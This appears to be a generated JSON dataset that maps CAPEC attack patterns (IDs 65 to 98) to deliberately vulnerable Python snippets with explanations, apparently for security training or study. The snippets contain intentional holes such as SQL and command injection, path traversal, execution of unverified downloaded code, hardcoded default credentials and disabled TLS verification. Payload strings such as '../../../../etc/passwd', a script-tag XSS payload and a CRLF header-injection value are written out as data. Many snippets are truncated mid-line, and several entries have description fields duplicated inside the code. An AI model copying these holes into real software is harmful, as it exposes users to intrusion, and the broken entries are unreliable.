        "description": "This code demonstrates a vulnerable file serving endpoint that improperly handles URL encoding, making it susceptible to path traversal attacks through encoded characters. The code attempts basic path sanitization but fails to handle multiple encodings, alternate representations, or nested encoded traversal sequences. An attacker can bypass the security check by using various URL encoding schemes to access files outside the intended directory."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "import socket\nimport urllib.request\n\ndef update_client_software():\n    # Download update from server in cleartext\n    update_url = 'http://example.com/client_update.py'\n    new_code = urllib.request.urlopen(update_url).read()\n    \n    # Send sensitive configuration data in cleartext\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect(('server.example.com', 80))\n    \n    auth_token = 'secret_token_12345'\n    config_data = f'TOKEN={auth_token};VERSION=2.0;API_KEY=abcdef123456'\n    client_socket.send(config_data.encode())\n    \n    # Execute downloaded code without verification\n    exec(new_code)\n    \n    return True",
        "description": "This code demonstrates multiple vulnerabilities including transmission of sensitive data (auth token and API key) in cleartext, downloading and executing code without verification, and storing sensitive information directly in the code. The update mechanism uses HTTP instead of HTTPS, making it susceptible to network sniffing, and executes downloaded code without any integrity checks."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "\"\"\"\nimport sqlite3\n\ndef get_user_info(username):\n    conn = sqlite3.connect('users.db')\n    cursor = conn.cursor()\n    \n    # Vulnerable SQL query construction\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    \n    try:\n        cursor.execute(query)\n        result = cursor.fetchone()\n        \n        if result:\n            print(f\"Error: User found - {result",
        "description": "\"This code demonstrates a classic SQL injection vulnerability where user input is directly concatenated into an SQL query without sanitization. It also includes error messages that leak sensitive information and leaves database cursors dangling. The code accepts a username parameter that can be manipulated to inject malicious SQL commands.\""
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "\"\"\"\nimport syslog\nimport sys\n\ndef log_user_activity(user_input):\n    # Vulnerable: directly using user input as format string\n    syslog.syslog(user_input)\n\ndef process_request(request_data):\n    message = request_data.get('message', '')\n    username = request_data.get('username', '')\n    \n    # Vulnerable: format string can be controlled by user\n    log_format = f\"{message",
        "description": "\"This code demonstrates a vulnerable implementation of syslog usage where user input is directly used as a format string parameter without proper validation or sanitization. The code also includes a buffer copy operation without size checking, making it susceptible to buffer overflow attacks. The combination of format string injection and improper buffer handling creates multiple security vulnerabilities.\""
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "\"\"\"\nimport hashlib\nimport os\n\nclass CodeSigner:\n    def __init__(self):\n        # Using weak MD5 hash for code signing\n        self.hash_algo = hashlib.md5()\n        self.private_key = b'weak_static_key'\n    \n    def sign_code(self, code_bytes):\n        # Missing proper cryptographic steps\n        self.hash_algo.update(code_bytes)\n        return self.hash_algo.hexdigest()\n    \n    def verify_signature(self, code_bytes, signature):\n        # Vulnerable verification that can be bypassed\n        current_hash = hashlib.md5(code_bytes).hexdigest()\n        if current_hash == signature:\n            # Compiler might optimize out this check\n            return True\n        return False\n\n    def load_and_execute(self, code_path, signature):\n        with open(code_path, 'rb') as f:\n            code = f.read()\n        \n        if self.verify_signature(code, signature):\n            # No immutable root of trust check\n            # Could execute malicious code\n            exec(code)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable code signing implementation using weak cryptographic methods (MD5), missing proper verification steps, and no hardware root of trust. The verification can be bypassed due to weak hashing, and the execution environment doesn't properly validate code signatures before execution, allowing potential malicious code execution.\"",
        "description": "\"This code demonstrates vulnerable code signing implementation using weak cryptographic methods (MD5), missing proper verification steps, and no hardware root of trust. The verification can be bypassed due to weak hashing, and the execution environment doesn't properly validate code signatures before execution, allowing potential malicious code execution.\""
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "import os\ndef admin_tool(user_input):\n    # Program running with root privileges\n    os.setuid(0)\n    \n    # Config file path controlled by user\n    config_path = user_input\n    \n    # Dangerous: Direct execution of user-controlled command\n    os.system(f'cat {config_path} > /etc/system.conf')\n    \n    # Load and execute user-provided library\n    import ctypes\n    user_lib = ctypes.CDLL(user_input)\n    user_lib.run()",
        "description": "A vulnerable program running with elevated privileges (root) that accepts user input without proper validation. It allows arbitrary command execution through OS command injection and loads untrusted libraries. The combination of unnecessary privileges and lack of input sanitization creates a severe security risk."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "class UserAuthentication:\n    def __init__(self):\n        self.users = {\n            'admin': 'admin123',\n            'system': 'password',\n            'root': '',\n            'guest': 'guest'\n        }\n\n    def authenticate(self, username, password):\n        if username in self.users:\n            if password == self.users[username]:\n                return True\n        return False\n\n    def create_user(self, username, password):\n        # No password complexity requirements\n        # No password expiration\n        # Single factor authentication only\n        self.users[username] = password\n\ndef main():\n    auth = UserAuthentication()\n    username = input('Username: ')\n    password = input('Password: ')\n    if auth.authenticate(username, password):\n        print('Access granted')\n    else:\n        print('Access denied')",
        "description": "This vulnerable code demonstrates weak authentication practices including hardcoded default credentials, lack of password complexity requirements, no password aging mechanism, and single-factor authentication. The system allows empty passwords and common default username/password combinations, making it susceptible to dictionary attacks and credential stuffing."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "\"\"\"\ndef validate_username(username):\n    # Basic validation before normalization (vulnerable)\n    if '<' in username or '>' in username:\n        return False\n    \n    # Normalize the Unicode string\n    normalized = username.encode('utf-8').decode('unicode_escape')\n    \n    # Store in database without proper encoding checks\n    db_connection = get_db_connection()\n    query = f\\\"SELECT * FROM users WHERE username = '{normalized",
        "description": "\"This vulnerable code demonstrates improper handling of Unicode encoding and validation order. It validates input before normalization, uses an incomplete denylist of dangerous characters, and directly interpolates normalized Unicode strings into SQL queries. The code fails to properly handle alternate encodings and special characters, making it susceptible to both SQL injection and XSS attacks through Unicode encoding bypasses.\""
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "\"\"\"\ndef download_file(url_param):\n    import urllib.request\n    import os\n    \n    # Directly use user-provided URL without proper validation or encoding checks\n    decoded_url = urllib.parse.unquote(url_param)\n    \n    # Extract filename from URL without sanitizing\n    filename = decoded_url.split('/')[-1]\n    \n    # Vulnerable: directly using user input in file operations\n    save_path = os.path.join('downloads', filename)\n    \n    # Download and save the file without checking encoding or content\n    urllib.request.urlretrieve(decoded_url, save_path)\n    return f'File saved to {save_path",
        "description": "\"This code accepts a URL parameter and attempts to download a file, but is vulnerable to URL encoding manipulation. It lacks proper validation of URL encoding, doesn't sanitize file paths, and blindly trusts user input. An attacker could use different URL encodings or path traversal sequences to access unauthorized files or execute arbitrary code.\""
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "\"\"\"\ndef save_user_file(filename, content):\n    # Save user-uploaded file without proper validation\n    file_path = f'uploads/{filename",
        "description": "\"This code demonstrates a vulnerable file handling system that accepts user input for filenames and content without proper validation or sanitization. It directly embeds user-supplied data into HTML content, making it susceptible to XSS attacks through malicious filenames or content. The code also fails to implement proper input validation, character filtering, or output encoding, allowing attackers to inject malicious scripts or redirect commands through carefully crafted filenames.\""
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "class UserSession:\n    def __init__(self):\n        self.state = 'INIT'\n        self.user_data = {}\n        self.is_admin = False\n    \n    def login(self, username, password):\n        if self.state != 'INIT':\n            return\n        \n        # Store sensitive data in cookies without encryption\n        self.user_data['auth_token'] = f'{username}:{password}'\n        self.state = 'AUTHENTICATED'\n    \n    def elevate_privileges(self):\n        # Missing state validation allows privilege escalation\n        if self.user_data.get('auth_token'):\n            self.is_admin = True\n            self.state = 'ADMIN'\n    \n    def process_transaction(self, amount):\n        # No integrity checks on state transitions\n        if hasattr(self, 'is_admin'):\n            return self.execute_transaction(amount)\n        \n    def execute_transaction(self, amount):\n        # Reentrant code vulnerability\n        if self.state == 'PROCESSING':\n            return\n        self.state = 'PROCESSING'\n        self.process_transaction(amount)\n        self.state = 'COMPLETED'",
        "description": "This vulnerable code demonstrates state management issues including cleartext storage of sensitive data, missing state validation, improper state transitions, and reentrant code problems. The UserSession class fails to properly validate state transitions, stores sensitive data without encryption, lacks integrity checks, and contains reentrant code vulnerabilities that could be exploited to manipulate application flow and elevate privileges."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "\"\"\"\nimport os\nimport subprocess\n\ndef process_config_file(file_path, command):\n    # Reads and processes a configuration file without validation\n    with open(file_path, 'r') as f:\n        config_data = f.read()\n    \n    # Directly executes commands from config without sanitization\n    subprocess.call(f\"{command",
        "description": "\"This code demonstrates vulnerable file handling and command execution by processing configuration files and system updates without proper validation. It accepts untrusted input for file paths and commands, lacks origin validation for data sources, performs no integrity checks on received data, and executes commands without sanitization. The code allows direct modification of system files without proper access controls or verification mechanisms.\""
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "def get_user_file(user_input):\n    base_dir = '/var/www/files/'\n    file_path = os.path.join(base_dir, user_input)\n    try:\n        with open(file_path, 'r') as file:\n            content = file.read()\n            return content\n    except:\n        return None\n\ndef save_user_file(filename, content):\n    file_path = '/var/www/files/' + filename\n    with open(file_path, 'w') as file:\n        file.write(content)\n\ndef process_file_request():\n    filename = request.args.get('file')\n    action = request.args.get('action')\n    if action == 'read':\n        return get_user_file(filename)\n    elif action == 'write':\n        content = request.args.get('content')\n        save_user_file(filename, content)",
        "description": "This vulnerable code allows path traversal and arbitrary file access through user-controlled input. It fails to properly sanitize file paths, enabling attackers to use '../' sequences to access files outside the intended directory. The code also lacks proper authorization checks and file path validation, allowing unrestricted file operations based on user input."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "\"\"\"\nDEBUG = False\nCONFIG = {\n    'admin': False,\n    'access_level': 0",
        "description": "\"This vulnerable code demonstrates external control of system configuration and authentication bypass. It allows direct modification of critical system variables (DEBUG) and configuration settings (CONFIG) through user input without validation. An attacker can manipulate these values to gain unauthorized access to admin functionality by setting 'admin': True or DEBUG=True in the input parameters.\""
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "def verify_filename(filename):\n    # Weak validation before canonicalization\n    if '../' in filename:\n        return False\n\n    # Simple path sanitization that can be bypassed\n    sanitized = filename.replace('\\\\', '/')\n\n    # Vulnerable file operation\n    try:\n        base_path = '/var/www/uploads/'\n        full_path = base_path + sanitized\n        with open(full_path, 'r') as f:\n            return f.read()\n    except:\n        return None",
        "description": "This vulnerable code attempts to validate a filename for path traversal but fails to properly handle backslash encoding and alternative path representations. It performs validation before canonicalization and uses simple string replacement, which can be bypassed using encoded backslashes or alternative path separators. An attacker could use payloads like '..\\/..\\/etc/passwd' to traverse directories."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "\"\"\"\ndef get_file_content(file_path):\n    # Allow both forward and backslashes in path\n    normalized_path = file_path.replace('\\\\', '/')\n    base_dir = '/var/www/files'\n    \n    try:\n        # Simple path normalization without proper validation\n        final_path = base_dir + '/' + normalized_path\n        \n        # Vulnerable: No proper path traversal checks\n        with open(final_path, 'r') as file:\n            return file.read()\n            \n    except Exception as e:\n        return str(e)\n\n# Example usage\nuser_input = '../../../../etc/passwd'\ncontent = get_file_content(user_input)\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable file access function that improperly handles path traversal attempts using different slash characters. It fails to properly validate and sanitize file paths, allowing directory traversal attacks through both forward and backward slashes. The code directly concatenates user input into the file path without proper canonicalization or validation, potentially exposing sensitive files outside the intended directory.\"",
        "description": "\"This code demonstrates a vulnerable file access function that improperly handles path traversal attempts using different slash characters. It fails to properly validate and sanitize file paths, allowing directory traversal attacks through both forward and backward slashes. The code directly concatenates user input into the file path without proper canonicalization or validation, potentially exposing sensitive files outside the intended directory.\""
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "\"\"\"\ndef process_user_filename(user_input):\n    # Vulnerable: Directly processes UTF-8 input without proper validation\n    encoded_input = user_input.encode('utf-8')\n    filename = encoded_input.decode('utf-8', errors='ignore')\n    \n    # Basic check that fails to catch UTF-8 encoding tricks\n    if '<' not in filename and '>' not in filename:\n        with open(filename, 'r') as file:\n            content = file.read()\n            return content\n    return 'Invalid filename'\n\ndef handle_user_input(data):\n    # Vulnerable: Validates before canonicalization\n    if len(data) < 100:  # Simple validation\n        # Convert to UTF-8 but doesn't handle overlong encodings properly\n        normalized = data.encode('utf-8').decode('utf-8')\n        return process_user_filename(normalized)\n    return None\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates improper handling of UTF-8 encoded input, particularly in file operations. It fails to properly validate UTF-8 encoded strings before using them in file operations, and performs validation before canonicalization. The code is susceptible to UTF-8 encoding tricks where attackers can use overlong encodings to bypass simple character checks. It also demonstrates weak input validation and improper file path handling.\"",
        "description": "\"This vulnerable code demonstrates improper handling of UTF-8 encoded input, particularly in file operations. It fails to properly validate UTF-8 encoded strings before using them in file operations, and performs validation before canonicalization. The code is susceptible to UTF-8 encoding tricks where attackers can use overlong encodings to bypass simple character checks. It also demonstrates weak input validation and improper file path handling.\""
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "import logging\nimport os\n\ndef setup_logging():\n    logging.basicConfig(filename='web_server.log', level=logging.INFO)\n\ndef log_user_activity(user_input):\n    # Vulnerable: directly writing unsanitized user input to logs\n    logging_message = f'User activity: {user_input}'\n    logging.info(logging_message)\n\ndef configure_log_permissions():\n    # Vulnerable: setting overly permissive log file permissions\n    os.chmod('web_server.log', 0o666)\n\ndef process_request(request_data):\n    # Vulnerable: No validation of input containing CRLF or special characters\n    user_activity = request_data.get('activity', '')\n    log_user_activity(user_activity)\n    return 'Request logged'\n\n# Example usage\nrequest = {'activity': 'login\\n\\rmalicious_payload\\n\\r%0A%0DSystem command'}\nsetup_logging()\nconfigure_log_permissions()\nprocess_request(request)",
        "description": "This code demonstrates vulnerable logging practices including direct logging of unsanitized user input, improper log file permissions, and lack of input validation for CRLF sequences and special characters. The code allows attackers to inject malicious content into log files and potentially execute log injection attacks."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "import xml.etree.ElementTree as ET\n\ndef process_xml_input(xml_data):\n    try:\n        # Vulnerable: No validation against schema\n        tree = ET.fromstring(xml_data)\n        \n        # Vulnerable: No limit on entity expansion\n        for elem in tree.iter():\n            # Process all elements without checks\n            process_element_content(elem.text)\n            \n        # Vulnerable: Allows external entity references\n        for entity in tree.iter('entity'):\n            ref = entity.get('ref')\n            if ref and ref.startswith('http'):\n                # Blindly fetch and process external entities\n                import urllib.request\n                external_data = urllib.request.urlopen(ref).read()\n                process_entity(external_data)\n                \n    except Exception as e:\n        pass\n\ndef process_element_content(content):\n    # Process content without sanitization\n    return content\n\ndef process_entity(data):\n    # Process external entity data without validation\n    return data",
        "description": "This code demonstrates multiple XML processing vulnerabilities: missing XML schema validation (CWE-112), allowing unrestricted external entity references (CWE-611), no protection against recursive entity expansion (CWE-776), and lack of input sanitization that could lead to XML injection (CWE-91). The code blindly processes XML input without proper validation, allows unlimited entity expansion, and fetches external entities without restrictions."
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "\"\"\"\ndef get_user_credentials(username, password):\n    # Load users.xml containing user credentials\n    xml_doc = etree.parse('users.xml')\n    \n    # Vulnerable XPath query construction using string concatenation\n    xpath_query = \\\"\\\"\\\"//users/user[username/text()='{",
        "description": "\"This code demonstrates a vulnerable implementation of XML authentication using XPath queries. The vulnerability lies in directly inserting user input into the XPath query without proper sanitization. An attacker can inject malicious XPath expressions (e.g., ' or '1'='1) to bypass authentication or extract unauthorized data from the XML database. The code fails to validate input and neutralize special XML characters, making it susceptible to XPath injection attacks.\""
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "\"\"\"\nimport lxml.etree as etree\n\ndef query_user_data(username):\n    # Load XML database\n    xml_db = etree.parse('users.xml')\n    \n    # Vulnerable XQuery construction with user input\n    xquery = f\\\"\\\"\\\"\n    for $user in doc('users.xml')//users\n    where $user/name = '{username",
        "description": "\"This code demonstrates a vulnerable XQuery implementation that directly incorporates user input into an XQuery expression without proper sanitization. The vulnerability allows an attacker to inject malicious XQuery commands that could result in unauthorized access to data or command execution. The code uses string formatting to construct the query, making it susceptible to injection attacks similar to SQL injection but in the context of XML querying.\""
    },
    {
        "capec_id": "85",
        "capec_name": "AJAX Footprinting",
        "code_snippet": "class AjaxScanner:\n    def __init__(self, target_url):\n        self.target_url = target_url\n        self.scan_results = {}\n\n    def scan_endpoint(self, input_data):\n        # Vulnerable endpoint that doesn't sanitize input\n        response = requests.post(\n            f\"{self.target_url}/api\",\n            data={'user_input': input_data},\n            headers={'X-Requested-With': 'XMLHttpRequest'}\n        )\n        \n        # Vulnerable output rendering without proper encoding\n        output = f\"<div>{response.text}</div>\"\n        \n        # Store scan results without validation\n        self.scan_results[input_data] = output\n        return output\n\n    def rapid_scan(self):\n        # Perform rapid Ajax requests without rate limiting\n        payloads = ['<script>alert(1)</script>', '../../../etc/passwd', '\\r\\nSet-Cookie: malicious=1']\n        \n        for payload in payloads:\n            # Execute multiple requests without proper validation\n            result = self.scan_endpoint(payload)\n            \n            # Process response without proper sanitization\n            if '<error>' not in result:\n                print(f'Potentially vulnerable: {payload}')",
        "description": "This vulnerable code demonstrates an Ajax-based scanning tool that can be used for reconnaissance and vulnerability detection. It includes multiple security issues: lack of input validation, improper output encoding, missing rate limiting for rapid requests, and potential for XSS and HTTP response splitting. The code allows for rapid enumeration of endpoints while storing unsanitized user input and rendered output."
    },
    {
        "capec_id": "86",
        "capec_name": "XSS Through HTTP Headers",
        "code_snippet": "from flask import Flask, request, make_response\n\ndef create_user_profile(user_input):\n    # Create HTML response with unvalidated user input\n    html = f'<html><head><title>User Profile</title></head>'\n    html += f'<body>Welcome, {user_input}!'\n    html += f'<img src=\"{request.args.get(\"avatar\")}\" />'\n    \n    # Create response with unsafe user-controlled headers\n    response = make_response(html)\n    response.headers['X-User-Profile'] = request.headers.get('X-User-Data')\n    response.headers['Content-Security-Policy'] = request.args.get('csp')\n    \n    # Attempt to filter scripts but with incomplete blacklist\n    user_content = request.args.get('content')\n    filtered_content = user_content.replace('<script>', '')\n    html += filtered_content\n    \n    return response",
        "description": "This vulnerable code demonstrates multiple XSS vectors including unvalidated user input directly inserted into HTML content, unsafe handling of HTTP headers, improper IMG tag attribute sanitization, and incomplete script tag filtering. The code allows attackers to inject malicious scripts through various entry points including request parameters, headers, and user content."
    },
    {
        "capec_id": "87",
        "capec_name": "Forceful Browsing",
        "code_snippet": "from flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/admin')\ndef admin_panel():\n    # Missing authentication check\n    return 'Admin Panel - User data: ' + get_sensitive_data()\n\n@app.route('/user/<user_id>/profile')\ndef user_profile(user_id):\n    # No authorization verification\n    # Sensitive data exposed in URL\n    api_key = request.args.get('api_key')\n    return f'Profile data for user {user_id}'\n\n@app.route('/download/<path:filename>')\ndef download_file(filename):\n    # Direct file access without access control\n    return send_file(f'files/{filename}')\n\ndef get_sensitive_data():\n    return 'credit_cards=1234-5678-9012-3456&ssn=123-45-6789'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates multiple vulnerabilities related to forceful browsing and improper authorization. It includes endpoints that lack proper authentication checks, expose sensitive data in URLs, and allow direct access to resources without verification. The admin panel is accessible without authentication, user profiles can be accessed without authorization checks, and file downloads are possible through direct URL manipulation."
    },
    {
        "capec_id": "88",
        "capec_name": "OS Command Injection",
        "code_snippet": "def process_user_files(user_path):\n    # Process files in user-specified directory\n    user_input = input('Enter command (ls/rm/cp): ')\n    file_pattern = input('Enter file pattern: ')\n    \n    command = f'find {user_path} -name {file_pattern} -exec {user_input} {} \\;'\n    os.system(command)",
        "description": "This code accepts user input to construct and execute shell commands without proper input validation or sanitization, allowing command injection through malicious input in the command or file pattern parameters. An attacker could inject additional commands using shell metacharacters."
    },
    {
        "capec_id": "89",
        "capec_name": "Pharming",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nimport requests\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\n\nclass VulnerableDNSHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        # Vulnerable DNS resolution without proper validation\n        client_ip = self.client_address[0]\n        try:\n            hostname = socket.gethostbyaddr(client_ip)[0]\n            \n            # No validation of hostname authenticity\n            if 'trusted-bank.com' in hostname:\n                # Blindly trust client-provided data\n                user_input = self.headers.get('User-Data', '')\n                \n                # No input sanitization\n                response = f\\\"\\\"\\\"\n                <html>\n                    <body>\n                        <h1>Welcome to Trusted Bank</h1>\n                        <div>{user_input",
        "description": "\"This code demonstrates a vulnerable web server that performs insecure DNS resolution, lacks proper origin validation, relies on client-side security, allows XSS through unsanitized input, and downloads/executes code without verification. It illustrates how a pharming attack could succeed by exploiting these vulnerabilities to impersonate a trusted banking website.\""
    },
    {
        "capec_id": "90",
        "capec_name": "Reflection Attack in Authentication Protocol",
        "code_snippet": "class AuthenticationServer:\n    def __init__(self):\n        self.challenge = None\n        self.authenticated_users = set()\n\n    def generate_challenge(self):\n        self.challenge = ''.join(random.choices('0123456789', k=8))\n        return self.challenge\n\n    def verify_response(self, client_response):\n        # Vulnerable: Server doesn't track if challenge was used before\n        # Allows replay attacks and reflection attacks\n        if client_response == self.challenge:\n            return True\n        return False\n\ndef client_authenticate(server, client_id):\n    # Client receives challenge from server\n    challenge = server.generate_challenge()\n    \n    # Vulnerable: Client simply echoes back the challenge\n    # This allows an attacker to replay the challenge directly\n    response = challenge\n    \n    # Send response back to server\n    if server.verify_response(response):\n        return True\n    return False",
        "description": "This code demonstrates a vulnerable authentication protocol implementation that's susceptible to reflection attacks. The server generates a challenge, but doesn't track whether challenges have been used before, and the verification is overly simple. The client simply echoes back the challenge without any transformation, making it vulnerable to replay attacks. An attacker can intercept the challenge and replay it directly to impersonate a legitimate user."
    },
    {
        "capec_id": "91",
        "capec_name": "DEPRECATED: XSS in IMG Tags",
        "code_snippet": "\"\"\"\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/profile', methods=['POST'])\ndef update_profile():\n    # Get user input for profile image\n    image_url = request.form.get('image_url')\n    \n    # Vulnerable implementation: directly embedding user input into IMG tag\n    html_content = f'''\n        <div class=\"profile\">\n            <img src=\"{image_url",
        "description": "\"This code demonstrates a vulnerable web application that processes user-supplied image URLs and embeds them directly into HTML IMG tags without proper sanitization. It includes an incomplete XSS protection filter that only removes basic script tags, leaving the application vulnerable to alternate XSS syntax, doubled character attacks, and attribute-based script injection through the IMG tag's src attribute.\""
    },
    {
        "capec_id": "92",
        "capec_name": "Forced Integer Overflow",
        "code_snippet": "\"\"\"\ndef allocate_and_copy(size, data):\n    # Convert user input to int\n    buffer_size = int(size)\n    \n    # Vulnerable: No check for integer overflow\n    total_size = buffer_size * 4\n    \n    # Allocate buffer based on potentially overflowed size\n    buffer = bytearray(total_size)\n    \n    # Copy data without proper bounds checking\n    for i in range(len(data)):\n        buffer[i] = data[i]\n        \n    return buffer\n    \ndef vulnerable_function():\n    user_size = input('Enter size: ')\n    user_data = bytes(input('Enter data: '), 'utf-8')\n    \n    # Can trigger integer overflow with large size\n    # Then lead to buffer overflow during copy\n    result = allocate_and_copy(user_size, user_data)\n    return result\n\"\"\",\n    \"description\": \"This code is vulnerable to integer overflow and buffer overflow attacks. It takes a user-controlled size input, multiplies it without checking for overflow, allocates memory based on the potentially overflowed size, and copies data without proper bounds checking. An attacker can provide a large size value that causes integer wraparound, resulting in a smaller buffer allocation than expected, leading to a buffer overflow when copying data.\"",
        "description": "\"This code is vulnerable to integer overflow and buffer overflow attacks. It takes a user-controlled size input, multiplies it without checking for overflow, allocates memory based on the potentially overflowed size, and copies data without proper bounds checking. An attacker can provide a large size value that causes integer wraparound, resulting in a smaller buffer allocation than expected, leading to a buffer overflow when copying data.\""
    },
    {
        "capec_id": "93",
        "capec_name": "Log Injection-Tampering-Forging",
        "code_snippet": "import logging\n\ndef log_user_activity(user_input):\n    logger = logging.getLogger('user_activity')\n    logger.setLevel(logging.INFO)\n    file_handler = logging.FileHandler('user_activity.log', 'a')\n    logger.addHandler(file_handler)\n    \n    # Vulnerable: directly writing user input to log without sanitization\n    logger.info(f'User activity: {user_input}')\n    \n    # Vulnerable: logging sensitive data\n    user_credentials = {'username': 'admin', 'password': 'secret123'}\n    logger.debug(f'Debug info - credentials used: {user_credentials}')\n    \n    # Vulnerable: excessive logging\n    large_data = {'user_data': 'x' * 1000000}\n    logger.info(f'Complete user state: {large_data}')",
        "description": "This vulnerable code demonstrates log injection by directly writing unsanitized user input to log files, exposing sensitive information through logging, and logging excessive data. An attacker could inject malicious content including CRLF sequences to manipulate log entries, view sensitive credentials through log files, and potentially cause denial of service through log file bloat."
    },
    {
        "capec_id": "94",
        "capec_name": "Adversary in the Middle (AiTM)",
        "code_snippet": "import socket\nimport ssl\n\ndef create_insecure_server():\n    context = ssl.create_default_context()\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 4433))\n    sock.listen(5)\n    \n    # Vulnerable: SSL context modified after socket creation\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n    \n    ssl_sock = context.wrap_socket(sock, server_side=True,\n                                  certfile='server.crt',\n                                  keyfile='server.key')\n    \n    while True:\n        conn, addr = ssl_sock.accept()\n        # Vulnerable: No proper authentication check\n        data = conn.recv(1024)\n        \n        # Vulnerable: Simply echoing back data without verification\n        if data:\n            conn.send(b'Access granted: ' + data)\n        \n        conn.close()",
        "description": "This code demonstrates multiple vulnerabilities in SSL/TLS implementation including improper authentication, SSL context modification after socket creation, and lack of proper endpoint verification. It creates an SSL server that doesn't properly verify client identity, allows connection without proper certificate validation, and is susceptible to man-in-the-middle attacks. The server blindly accepts and responds to any incoming data without proper authentication or validation."
    },
    {
        "capec_id": "95",
        "capec_name": "WSDL Scanning",
        "code_snippet": "\"\"\"\nfrom flask import Flask\nfrom zeep import Client\nimport xml.etree.ElementTree as ET\n\napp = Flask(__name__)\n\n@app.route('/expose_wsdl')\ndef expose_service_details():\n    # Publicly exposing WSDL with sensitive information\n    wsdl_url = 'http://internal-service.company.com/secret_service?wsdl'\n    client = Client(wsdl_url)\n    \n    # Expose all service methods and parameters publicly\n    service_info = {",
        "description": "\"This code demonstrates vulnerable WSDL exposure and sensitive information disclosure through a web service. It exposes internal service details, authentication information, and configuration files through public endpoints. The code makes sensitive WSDL information publicly accessible and stores configuration in externally accessible locations, violating secure design principles.\""
    },
    {
        "capec_id": "96",
        "capec_name": "Block Access to Libraries",
        "code_snippet": "\"\"\"\nimport platform\nimport ctypes\n\ndef load_external_library():\n    try:\n        if platform.system() == 'Windows':\n            lib = ctypes.WinDLL('custom_library.dll')\n        else:\n            lib = ctypes.CDLL('libcustom.so')\n        \n        # Unsafe direct memory access\n        buffer = (ctypes.c_char * 100)()\n        lib.process_data(buffer, 200)  # Buffer overflow risk\n        \n        # Blocking operation in non-blocking context\n        result = lib.long_running_operation()\n        \n        return buffer.raw\n    except Exception as e:\n        # Improper error handling - continues execution\n        pass\n        \n    # Program continues in potentially insecure state\n    return None\n\ndef main():\n    data = load_external_library()\n    if data:\n        process_data(data)\n\"\"\",\n    \"description\": \"This code demonstrates vulnerable library handling by attempting to load platform-specific external libraries without proper error handling, performing unsafe memory operations, and containing blocking operations in a potentially non-blocking context. It continues execution even when library access fails, potentially leaving the application in an insecure state.\"",
        "description": "\"This code demonstrates vulnerable library handling by attempting to load platform-specific external libraries without proper error handling, performing unsafe memory operations, and containing blocking operations in a potentially non-blocking context. It continues execution even when library access fails, potentially leaving the application in an insecure state.\""
    },
    {
        "capec_id": "97",
        "capec_name": "Cryptanalysis",
        "code_snippet": "import hashlib\nimport random\n\ndef encrypt_data(data):\n    # Using a weak random number generator\n    seed = 12345\n    random.seed(seed)\n    \n    # Using a predictable IV\n    iv = str(random.randint(1, 1000))\n    \n    # Using MD5 (broken crypto algorithm)\n    key = hashlib.md5(iv.encode()).hexdigest()\n    \n    # Simple XOR encryption with predictable key\n    encrypted = ''\n    for i, char in enumerate(data):\n        encrypted += chr(ord(char) ^ ord(key[i % len(key)]))\n    \n    return encrypted, iv\n\n# Usage\nsensitive_data = \"secret_password123\"\nencrypted_data, iv = encrypt_data(sensitive_data)",
        "description": "This code demonstrates multiple cryptographic vulnerabilities: using a weak random number generator with a fixed seed, generating predictable initialization vectors (IVs), employing the broken MD5 hash algorithm, and implementing a weak custom encryption method using simple XOR operations with a predictable key derived from the IV. These vulnerabilities make the encryption susceptible to cryptanalysis attacks."
    },
    {
        "capec_id": "98",
        "capec_name": "Phishing",
